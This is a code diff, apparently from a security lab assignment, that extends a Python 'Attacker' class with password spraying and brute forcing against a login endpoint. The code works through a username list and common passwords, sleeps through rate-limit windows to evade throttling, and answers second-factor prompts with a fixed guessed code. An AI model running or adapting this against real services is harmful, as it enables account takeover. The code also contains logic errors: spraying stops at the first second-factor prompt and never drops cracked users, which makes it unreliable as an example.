@@ -1,6 +1,6 @@
 import os
 import time
-import pyotp
+import json
 import requests
 
 class Attacker:
@@ -35,15 +35,45 @@ class Attacker:
         if captcha_token:
             payload["captcha_token"] = captcha_token   
         return self.session.post(url, json=payload)
-
-    def login_totp(self, username, totp_secret):
+    
+    def login_totp(self, username, token_attempt):
         url = f"{self.base_url}/login_totp"
-        token = pyotp.TOTP(totp_secret).now()
-        payload = {"username": username, "totp_token": token}
+        payload = {"username": username, "totp_token": token_attempt}
         return self.session.post(url, json=payload)
     
-    def run_password_spray():
-        pass
+    def run_password_spraying(self, top_n=5):
+        usernames = []
+        with open(self.users_path, 'r') as f:
+            users_data = json.load(f)
+            usernames = [u['username'] for u in users_data["users"]]
+
+        common_passwords = []
+        with open(self.dictionary_path, 'r', encoding='utf-8', errors='ignore') as f:
+            for i, line in enumerate(f):
+                if i >= top_n: break
+                common_passwords.append(line.strip())
+
+        active_targets = usernames.copy()
+        
+        for password in common_passwords:
+            cracked_in_round = []
+            for username in active_targets:
+                resp = self.login_attempt(username, password, captcha_token=None)
+                data = resp.json()
+                status = data.get("status")
+                
+                match status:
+                    case "success":
+                        print(f"{username} cracked with password {password}")
+                        cracked_in_round.append(username)
+                    case "totp_required":
+                        totp_resp = self.login_totp(username, "12345")
+                        return totp_resp.json().get("status") == "totp_success"
+                    case "rate_limit_reached":
+                        # sleep for window
+                        print("sleeping for: ", data.get("retry_after"))
+                        time.sleep(data.get("retry_after"))
+
 
     def run_brute_force(self, target_username, target_totp_secret=None):
         for password in self.password_list:
@@ -57,10 +87,8 @@ class Attacker:
                     case "success":
                         return True
                     case "totp_required":
-                        totp_resp = self.login_totp(target_username, target_totp_secret)
-                        if totp_resp.json().get("status") == "totp_success":
-                            return True
-                        break
+                        totp_resp = self.login_totp(target_username, "12345")
+                        return totp_resp.json().get("status") == "totp_success"
                     case "rate_limit_reached":
                         # sleep for window
                         print("sleeping for: ", data.get("retry_after"))
@@ -88,6 +116,5 @@ if __name__ == "__main__":
     GROUP_SEED = "214265977"
     
     attacker = Attacker(BASE_URL, DICTIONARY_FILE_PATH, USERS_FILE_PATH, GROUP_SEED)
-    result = attacker.run_brute_force("user_weak_1")
-    print(result)
+    attacker.run_brute_force("user_weak_1")
     
